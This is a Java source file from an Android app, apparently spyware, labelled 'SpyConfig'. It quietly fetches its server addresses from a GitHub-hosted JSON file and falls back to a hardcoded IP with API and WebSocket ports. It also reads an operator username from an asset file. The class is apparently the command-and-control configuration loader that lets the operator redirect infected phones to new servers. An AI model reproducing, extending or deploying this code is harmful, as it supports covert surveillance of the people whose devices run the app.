package com.voyre.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Config {
    private static final String TAG = "SpyConfig";
    
    // Langsung tembak ke link Raw GitHub lu
    private static final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/virzst/Virzdb/main/spy.json";
    
    public static String API_URL = "http://159.89.102.173:2000";
    public static String WS_URL = "ws://159.89.102.173:2021";
    
    public static void loadConfig(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences("spy_config", Context.MODE_PRIVATE);
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        URL url = new URL(GITHUB_RAW_URL);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        
                        // Udah nggak butuh header Authorization atau Accept khusus lagi
                        conn.setConnectTimeout(5000);
                        conn.setReadTimeout(5000);
                        
                        int responseCode = conn.getResponseCode();
                        if (responseCode == 200) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                response.append(line);
                            }
                            reader.close();
                            
                            JSONObject config = new JSONObject(response.toString());
                            
                            if (config.has("api_url")) {
                                API_URL = config.getString("api_url");
                            }
                            if (config.has("ws_url")) {
                                WS_URL = config.getString("ws_url");
                            }
                            
                            prefs.edit()
                                .putString("api_url", API_URL)
                                .putString("ws_url", WS_URL)
                                .apply();
                        }
                        conn.disconnect();
                    } catch (Exception e) {
                        API_URL = prefs.getString("api_url", "http://159.89.102.173:2000");
                        WS_URL = prefs.getString("ws_url", "ws://159.89.102.173:2021");
                    }
                }
            }).start();
        } catch (Exception e) {}
    }
    
    public static String getUsername(Context context) {
        try {
            InputStream is = context.getAssets().open("@kaell_Xz");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String username = reader.readLine();
            reader.close();
            is.close();
            return username != null ? username.trim() : "default";
        } catch (Exception e) {
            return "default";
        }
    }
}
